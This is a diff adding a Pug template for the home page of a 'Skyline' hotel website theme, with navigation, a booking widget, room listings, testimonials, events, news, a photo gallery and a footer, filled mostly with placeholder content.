@@ -1,0 +1,884 @@
+doctype html
+html(lang='en')
+  head
+    meta(charset='UTF-8')
+    title Home 1
+    meta(http-equiv='X-UA-Compatible', content='IE=edge')
+    meta(name='viewport', content='width=device-width, initial-scale=1')
+    // GOOGLE FONT
+    link(href='https://fonts.googleapis.com/css?family=Playfair+Display:400,700,900', rel='stylesheet')
+    link(href='https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800', rel='stylesheet')
+    link(href='https://fonts.googleapis.com/css?family=Montserrat:100,200,300,400,500,600,700,800,900', rel='stylesheet')
+    // CSS LIBRARY
+    link(rel='stylesheet', type='text/css', href='css/font-awesome.min.css')
+    link(rel='stylesheet', type='text/css', href='css/ionicons.min.css')
+    link(rel='stylesheet', type='text/css', href='css/owl.carousel.min.css')
+    link(rel='stylesheet', type='text/css', href='css/gallery.css')
+    link(rel='stylesheet', type='text/css', href='css/vit-gallery.css')
+    link(rel='shortcut icon', type='text/css', href='images/favicon.png')
+    link(rel='stylesheet', type='text/css', href='css/bootstrap-select.min.css')
+    link(rel='stylesheet', type='text/css', href='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.7.1/css/bootstrap-datepicker.css')
+    // MAIN STYLE
+    link(rel='stylesheet', href='css/styles.css')
+  body
+    // HEADER
+    header.header-sky
+      .container
+        // HEADER-TOP
+        .header-top
+          .header-top-left
+            span
+              i.ion-android-cloud-outline
+              | 18 °C
+            span
+              i.ion-ios-location-outline
+              |  121 King Str, Melbourne Victoria
+            span
+              i.fa.fa-phone(aria-hidden='true')
+              |  1-548-854-8898
+          .header-top-right
+            ul
+              li.dropdown
+                a.dropdown-toggle(href='login.html', title='LOGIN') LOGIN
+              li.dropdown
+                a.dropdown-toggle(href='register.html', title='REGISTER') REGISTER
+              li.dropdown
+                a.dropdown-toggle(href='#', data-toggle='dropdown')
+                  | USD 
+                  b.caret
+                ul.dropdown-menu
+                  li.active
+                    a(href='#') USD
+                  li
+                    a(href='#') EUR
+              li.dropdown
+                a.dropdown-toggle(href='#', data-toggle='dropdown')
+                  | ENG 
+                  b.caret
+                ul.dropdown-menu
+                  li.active
+                    a(href='#') ENG
+                  li
+                    a(href='#') JP
+        // END/HEADER-TOP
+        // MENU-HEADER
+        .menu-header
+          nav.navbar.navbar-fixed-top
+            .container
+              .navbar-header
+                button.navbar-toggle(type='button', data-toggle='collapse', data-target='.navbar-collapse')
+                  span.sr-only Toggle navigation
+                  span.icon-bar
+                  span.icon-bar
+                  span.icon-bar
+                a.navbar-brand(href='#', title='Skyline')
+                  img(src='images/Home-1/sky-logo-header.png', alt='#')
+              .collapse.navbar-collapse
+                ul.nav.navbar-nav.navbar-right
+                  li.dropdown
+                    a.dropdown-toggle(href='index.html', title='Home', data-toggle='dropdown')
+                      | Home
+                      b.caret
+                    ul.dropdown-menu.icon-fa-caret-up.submenu-hover
+                      li
+                        a(href='#', title='') Home 1
+                      li
+                        a(href='#', title='') Home 2
+                      li
+                        a(href='#', title='') Home 3
+                      li
+                        a(href='#', title='') Home 4
+                  li.dropdown
+                    a.dropdown-toggle(href='room_1.html', title='Room & Rate', data-toggle='dropdown')
+                      | Room & Rate
+                      b.caret
+                    ul.dropdown-menu.icon-fa-caret-up.submenu-hover
+                      li
+                        a(href='#', title='') Room 1
+                      li
+                        a(href='#', title='') Room 2
+                      li
+                        a(href='#', title='') Room 3
+                      li
+                        a(href='#', title='') Room 4
+                      li
+                        a(href='#', title='') Room 5
+                      li
+                        a(href='#', title='') Room 6
+                      li
+                        a(href='#', title='') Room Detail
+                  li.dropdown
+                    a.dropdown-toggle(href='#', title='  Page', data-toggle='dropdown')
+                      | Page
+                      b.caret
+                    ul.dropdown-menu.icon-fa-caret-up.submenu-hover
+                      li
+                        a(href='#', title='') Guest Book
+                      li.submenu-hover1
+                        a.dropdown-toggle(href='event_page_1.html', data-toggle='dropdown')
+                          | Events 
+                          b.caret
+                        ul.dropdown-menu.dropdown-margin
+                          li
+                            a(href='#') Events 
+                          li
+                            a(href='#') Events Fullwidth
+                      li
+                        a(href='#', title='') Attractions
+                      li.submenu-hover1
+                        a.dropdown-toggle(href='#', data-toggle='dropdown')
+                          | Blog 
+                          b.caret
+                        ul.dropdown-menu.dropdown-margin
+                          li
+                            a(href='#') Blog 
+                          li
+                            a(href='#') Blog Detail
+                      li.submenu-hover1
+                        a.dropdown-toggle(href='#', data-toggle='dropdown')
+                          | Restaurant 
+                          b.caret
+                        ul.dropdown-menu.dropdown-margin
+                          li
+                            a(href='#') Restaurant 1
+                          li
+                            a(href='#') Restaurant 2
+                          li
+                            a(href='#') Restaurant 3
+                          li
+                            a(href='#') Restaurant 4
+                      li.submenu-hover1
+                        a.dropdown-toggle(href='#', data-toggle='dropdown')
+                          | Tems Condition  
+                          b.caret
+                        ul.dropdown-menu.dropdown-margin
+                          li
+                            a(href='#') Tems Condition  1
+                          li
+                            a(href='#') Tems Condition  2
+                      li
+                        a(href='#', title='') 404 Page
+                      li
+                        a(href='#', title='') Comming Soon
+                      li
+                        a(href='#', title='') Check Out
+                  li.dropdown
+                    a.dropdown-toggle(href='#', title='Reservation', data-toggle='dropdown')
+                      | RESERVATION
+                      b.caret
+                    ul.dropdown-menu.icon-fa-caret-up.submenu-hover
+                      li
+                        a(href='#', title='') Reservation 1
+                      li
+                        a(href='#', title='') Reservation 2
+                      li
+                        a(href='#', title='') Reservation 3
+                      li
+                        a(href='#', title='') Reservation 4
+                      li
+                        a(href='#', title='') Reservation 5
+                  li.dropdown
+                    a.dropdown-toggle(href='#', title='Gallery', data-toggle='dropdown')
+                      | Gallery 
+                      b.caret
+                    ul.dropdown-menu.icon-fa-caret-up.submenu-hover
+                      li
+                        a(href='#', title='') Gallery 1
+                      li
+                        a(href='#', title='') Gallery 2
+                      li
+                        a(href='#', title='') Gallery 3
+                  li
+                    a(href='#', title='About') About
+                  li
+                    a(href='#', title='Contact') Contact
+        // END / MENU-HEADER
+        // END-HEADER
+        // SLIDER
+        section.section-slider.height-v
+          #index12.owl-carousel.owl-theme
+            .item
+              img.img-responsive(alt='Third slide', src='images/Home-1/Slider-v1.jpg')
+              .carousel-caption
+                h1 Welcome to Skyline
+                p
+                  span.line-t
+                  | Hotels & Resorts 
+                  span.line-b
+            .item
+              img.img-responsive(alt='Third slide', src='images/Home-2/Slider-v2.jpg')
+              .container
+                .carousel-caption
+                  h1.v2 Enjoy a Luxury  Experience
+                  p.p-v2
+                    span.line-t
+                    | Hotels & Resorts 
+                    span.line-b
+          .check-avail
+            .container
+              .arrival.date-title
+                label Arrival Date 
+                #datepicker.input-group.date(data-date-format='dd-mm-yyyy')
+                  input.form-control(type='text')
+                  span.input-group-addon
+                    img(src='images/Home-1/date-icon.png', alt='#')
+              .departure.date-title
+                label Departure Date 
+                #datepickeri.input-group.date(data-date-format='dd-mm-yyyy')
+                  input.form-control(type='text')
+                  span.input-group-addon
+                    img(src='images/Home-1/date-icon.png', alt='#')
+              .adults.date-title
+                label Adults
+                form
+                  .carousel-search
+                    .btn-group
+                      a.btn.dropdown-toggle(data-toggle='dropdown', href='#') 2
+                      ul.dropdown-menu
+                        li
+                          a 1
+                        li
+                          a 2
+                        li
+                          a 3
+                        li
+                          a 4
+              .children.date-title
+                label Children
+                form
+                  .carousel-search
+                    .btn-group
+                      a.btn.dropdown-toggle(data-toggle='dropdown', href='#') 2
+                      ul.dropdown-menu
+                        li
+                          a 1
+                        li
+                          a 2
+                        li
+                          a 3
+                        li
+                          a 4
+              .find_btn.date-title
+                .text-find
+                  | Check
+                  br
+                  | Availability
+        // END / SLIDER
+        // OUR-ROOMS
+        section.rooms
+          .container
+            h2.title-room Our Rooms
+            .outline
+            p.rooms-p
+              | When you host a party or family reunion, the special celebrations let you streng then bonds with
+            .wrap-rooms
+              .row
+                #rooms.owl-carousel.owl-theme
+                  .item
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-1.jpg', alt='PLuxury Room', title='Luxury Room')
+                        .rooms-content
+                          h4.sky-h4 Luxury Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-2.jpg', alt='Double Room', title='Double Room')
+                        .rooms-content
+                          h4.sky-h4 Double Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-3.jpg', alt='Family Room', title='Family Room')
+                        .rooms-content
+                          h4.sky-h4 Family Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-4.jpg', alt='Deluxe Room', title='Deluxe Room')
+                        .rooms-content
+                          h4.sky-h4 Deluxe Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-5.jpg', alt='Single Room', title='Single Room')
+                        .rooms-content
+                          h4.sky-h4 Single Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-6.jpg', alt='Presidential Room', title='Presidential Room')
+                        .rooms-content
+                          h4.sky-h4 Presidential Room
+                          p.price $320 / Per Night
+                  .item
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-1.jpg', alt='PLuxury Room', title='Luxury Room')
+                        .rooms-content
+                          h4.sky-h4 Luxury Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-2.jpg', alt='Double Room', title='Double Room')
+                        .rooms-content
+                          h4.sky-h4 Double Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-3.jpg', alt='Family Room', title='Family Room')
+                        .rooms-content
+                          h4.sky-h4 Family Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-4.jpg', alt='Deluxe Room', title='Deluxe Room')
+                        .rooms-content
+                          h4.sky-h4 Deluxe Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-5.jpg', alt='Single Room', title='Single Room')
+                        .rooms-content
+                          h4.sky-h4 Single Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-6.jpg', alt='Presidential Room', title='Presidential Room')
+                        .rooms-content
+                          h4.sky-h4 Presidential Room
+                          p.price $320 / Per Night
+                  .item
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-1.jpg', alt='PLuxury Room', title='Luxury Room')
+                        .rooms-content
+                          h4.sky-h4 Luxury Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-2.jpg', alt='Double Room', title='Double Room')
+                        .rooms-content
+                          h4.sky-h4 Double Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-3.jpg', alt='Family Room', title='Family Room')
+                        .rooms-content
+                          h4.sky-h4 Family Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-4.jpg', alt='Deluxe Room', title='Deluxe Room')
+                        .rooms-content
+                          h4.sky-h4 Deluxe Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-5.jpg', alt='Single Room', title='Single Room')
+                        .rooms-content
+                          h4.sky-h4 Single Room
+                          p.price $320 / Per Night
+                    .col-lg-4.col-md-4.col-sm-6.col-xs-6
+                      .wrap-box
+                        .box-img
+                          img.img-responsive(src='images/Home-1/our-6.jpg', alt='Presidential Room', title='Presidential Room')
+                        .rooms-content
+                          h4.sky-h4 Presidential Room
+                          p.price $320 / Per Night
+          // /container
+          // END / ROOMS
+          // ABOUT-US
+          section.about
+            .container
+              .row
+                .col-xs-12.col-sm-6.col-md-5.col-lg-5
+                  .about-centent
+                    h2.about-title About Us
+                    .line
+                    p.about-p
+                      | Contrary to popular belief, Lorem isn’t simply random text. It has roots in a of classical Latin literature from 45 BC, making it over 2000 years old. Avalon’s leading hotels with gracious island hospitality, thoughtful amenities and distinctive
+                    p.about-p1
+                      | Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage ...
+                    a.read-more(href='#') READ MORE 
+                .col-xs-12.col-sm-6.col-md-7.col-lg-7
+                  .about-img
+                    .img-1
+                      img.img-responsive(src='images/Home-1/about-3.jpg', alt='Image')
+                      .img-2
+                        img.img-responsive(src='images/Home-1/about-1.jpg', alt='Image')
+                      .img-3
+                        img.img-responsive(src='images/Home-1/about-2.jpg', alt='Image')
+          // END/ ABOUT-US
+          // BEST
+          section.best
+            .container
+              .row
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-1.png', alt='Image')
+                    h6.sky-h6 Master Bedrooms
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-2.png', alt='Image')
+                    h6.sky-h6 Sea View Balcony
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-3.png', alt='Image')
+                    h6.sky-h6 Pool & Spa
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-4.png', alt='Image')
+                    h6.sky-h6 Wifi Coverage
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-5.png', alt='Image')
+                    h6.sky-h6 AwESOME pACKAGES
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-6.png', alt='Image')
+                    h6.sky-h6 cLEANING eVERDAY
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-7.png', alt='Image')
+                    h6.sky-h6 bUTFFET Breakfast
+                .col-xs-6.col-sm-3.col-md-3.col-lg-3
+                  .wrap-best
+                    .icon-best
+                      img.img-responsive(src='images/Home-1/about-icon-8.png', alt='Image')
+                    h6.sky-h6 Airport Taxi
+          // END / BEST
+          // TESTIMONOALS
+          section.testimonials
+            .testimonials-h
+              .testimonials-content
+                .container
+                  #testimonials.owl-carousel.owl-theme
+                    .item
+                      .img-testimonials
+                        img(src='images/Home-1/about-testimonials-img.png', alt='#')
+                      p.testimonials-p
+                        span “
+                        | ​‌ This is the only place to stay in Catalina! I have stayed in the cheaper hotels and they were fine, but this is just the icing on the cake! After spending the day bike riding and hiking to come back and enjoy a glass of wine while looking out your 
+                        span ​‌​‌”
+                        |  ocean view window and then to top it all off...
+                      h5.sky-h5 JULIA ROSE
+                      p.testimonials-p1 From Los Angeles, California
+                    .item
+                      .img-testimonials
+                        img(src='images/Home-1/about-testimonials-img.png', alt='#')
+                      p.testimonials-p
+                        span “
+                        | ​‌ Thisis the only place to stay in Catalina! I have stayed in the cheaper hotels and they were fine, but this is just the icing onthe cake! After spending the day bike riding and hiking to come back and enjoy a glass of wine while looking out your 
+                        span ​‌​‌”
+                        |  ocean view window and then to top it all off...
+                      h5.sky-h5 JULIA ROSE
+                      p.testimonials-p1 From Los Angeles, California
+                    .item
+                      .img-testimonials
+                        img(src='images/Home-1/about-testimonials-img.png', alt='#')
+                      p.testimonials-p
+                        span “
+                        | ​‌ This is the only place to stay in Catalina! I have stayed in the cheaper hotels and they were fine, but this is just the icing on the cake! After spending the day bike riding and hiking to come back and enjoy a glass of wine while looking out your 
+                        span ​‌​‌”
+                        |  ocean view window and then to top it all off...
+                      h5.sky-h5 JULIA ROSE
+                      p.testimonials-p1 From Los Angeles, California
+          // END / TESTIMONOALS
+          // OUR-EVENTS
+          section.events
+            .container
+              h2.events-title Our Events
+              .line
+              #events-v2.owl-carousel.owl-theme
+                .item
+                  .events-item
+                    .events-img
+                      img.img-responsive(src='images/Home-1/Our-Events-1.jpg', alt='Image')
+                    .events-content
+                      a(href='#', title='')
+                        p.sky-p EVENTS
+                        h3.sky-h3 Wedding Day
+                .item
+                  .events-item
+                    .events-img
+                      img.img-responsive(src='images/Home-1/Our-Events-2.jpg', alt='Image')
+                    .events-content
+                      a(href='#', title='')
+                        p.sky-p EVENTS
+                        h3.sky-h3 Golf Cup 2017
+                .item
+                  .events-item
+                    .events-img
+                      img.img-responsive(src='images/Home-1/Our-Events-3.jpg', alt='Image')
+                    .events-content
+                      a(href='#', title='')
+                        p.sky-p EVENTS
+                        h3.sky-h3  Beach Sports
+          // END / OUR EVENTS
+          // OUR-NEWS
+          section.news
+            .container
+              h2.new-title News
+              .line
+              .row
+                .news-content
+                  .col-lg-4.col-md-4.col-sm-4.col-xs-12
+                    .substance
+                      .date
+                        .day 25
+                        .year
+                          | AUGUST
+                          br
+                          | 2017
+                      .text
+                        a(href='#') Update menu food in Skyline Hotel
+                      a.read-more(href='#') Read More
+                  .col-lg-4.col-md-4.col-sm-4.col-xs-12
+                    .substance
+                      .date
+                        .day 22
+                        .year
+                          | AUGUST
+                          br
+                          | 2017
+                      .text
+                        a(href='#') Las Maquinas on Tragamonedas
+                      a.read-more(href='#') Read More 
+                  .col-lg-4.col-md-4.col-sm-4.col-xs-12
+                    .substance
+                      .date
+                        .day 06
+                        .year
+                          | AUGUST
+                          br
+                          | 2017
+                      .text
+                        a(href='#') Mother Earth Hosts Our Travels
+                      a.read-more(href='#') Read More 
+          // END / OUR NEWS
+          // OUR-GALLERY
+          section.gallery-our
+            .container-fluid
+              .gallery
+                h2.title-gallery Our Gallery
+                .outline
+                ul.nav.nav-tabs.text-uppercase
+                  li.active
+                    a(data-toggle='tab', href='#Hotel') Hotel & Ground
+                  li
+                    a(data-toggle='tab', href='#menu1') Room/Suite 
+                  li
+                    a(data-toggle='tab', href='#menu2') Bathroom
+                  li
+                    a(data-toggle='tab', href='#menu3') Dining
+                br
+                .tab-content
+                  #Hotel.tab-pane.fade.in.active
+                    .product
+                      .row
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-1.jpg', alt='Product', title='images products')
+                            .gallery-box-main(title='')
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-1-1.jpg', data-littlelightbox-group='gallery', title='Luxury Room view all')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-2.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='HIHI')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-3.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-3-3.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-4.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-4-4.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-5.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-5-5.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-6.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-6-6.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-7.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-7-7.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-6.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-8.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-8-8.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                  #menu1.tab-pane.fade
+                    .product
+                      .row
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-6.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-7.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-3-3.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-8.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-4-4.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                  #menu2.tab-pane.fade
+                    .product
+                      .row
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-7.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-8.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-6-6.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                  #menu3.tab-pane.fade
+                    .product
+                      .row
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-3.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-4.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-5.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-6.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-7.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                        .gallery_product.col-lg-3.col-md-3.col-sm-4.col-xs-6
+                          .wrap-box
+                            .box-img
+                              img.img-responsive(src='images/Home-1/gallery-8.jpg', alt='Product', title='images products')
+                            .gallery-box-main
+                              .gallery-icon
+                                a.lightbox(href='images/Home-1/gallery-2-2.jpg', data-littlelightbox-group='gallery', title='Flying is life')
+                                  i.ion-ios-plus-empty(aria-hidden='true')
+                // end-tab-content
+                .text-center
+                  button.btn.btn-default.btn-our(type='button') VIEW MORE
+              // /gallery
+              // /container
+              // END / OUR GALLERY
+              // FOOTER
+              footer.footer-sky
+                .footer-top
+                  .container
+                    .row
+                      .col-xs-12.col-sm-12.col-md-1.col-lg-1
+                        .icon-email
+                          a(href='#', title='Email')
+                            img.img-responsive(src='images/Home-1/footer-top-icon-l.png', alt='Email')
+                      .col-xs-12.col-sm-12.col-md-7.col-lg-5
+                        .textbox
+                          form.form-inline
+                            .form-group
+                              .input-group
+                                input.form-control(type='email', placeholder='Your email address', aria-label='Search for...')
+                                button.btn.btn-secondary(type='button')
+                                  i.ion-android-send
+                      .col-xs-12.col-sm-12.col-md-4.col-lg-6.text-right
+                        .footer-icon-l
+                          a(href='#', title='Twitter')
+                            i.fa.fa-twitter(aria-hidden='true')
+                          a(href='#', title='Facebook')
+                            i.fa.fa-facebook-square(aria-hidden='true')
+                          a(href='#', title='Tripadvisor')
+                            i.fa.fa-tripadvisor(aria-hidden='true')
+                          a(href='#', title='Isnstagram')
+                            i.fa.fa-instagram(aria-hidden='true')
+                  // /container
+                  // /footer-top
+                  .footer-mid
+                    .container
+                      .row.padding-footer-mid
+                        .col-xs-12.col-sm-12.col-md-3.col-lg-3
+                          .footer-logo.text-center.list-content
+                            a(href='index.html', title='Skyline')
+                              img(src='images/Home-1/sky-logo-footer.png', alt='Image')
+                        .col-xs-4.col-sm-4.col-md-2.col-lg-2.col-lg-offset-1.col-md-offset-1
+                          .list-content
+                            ul
+                              li
+                                a(href='attractions.html', title='') Site Map
+                              li
+                                a(href='tems_condition_1.html', title='') Term & Conditions
+                              li
+                                a(href='#', title='') Privacy Policy
+                              li
+                                a(href='#', title='') Help
+                              li
+                                a(href='#', title='') Affiliate
+                        .col-xs-4.col-sm-4.col-md-2.col-lg-2.col-lg-offset-1.col-md-offset-1
+                          .list-content
+                            ul
+                              li
+                                a(href='#', title='') Our Location
+                              li
+                                a(href='#', title='') Career
+                              li
+                                a(href='about.html', title='') About Us
+                              li
+                                a(href='contact.html', title='') Contact Us
+                        .col-xs-4.col-sm-4.col-md-2.col-lg-2.col-lg-offset-1.col-md-offset-1
+                          .list-content
+                            ul
+                              li
+                                a(href='#', title='') FAQS
+                              li
+                                a(href='#', title='') News
+                              li
+                                a(href='#', title='') Photo & Video
+                              li
+                                a(href='#', title='') Restaurant
+                              li
+                                a(href='#', title='') Gift Card
+                      .footer-bottom
+                        .col-xs-12.col-sm-6.col-md-6.col-lg-6.no-padding
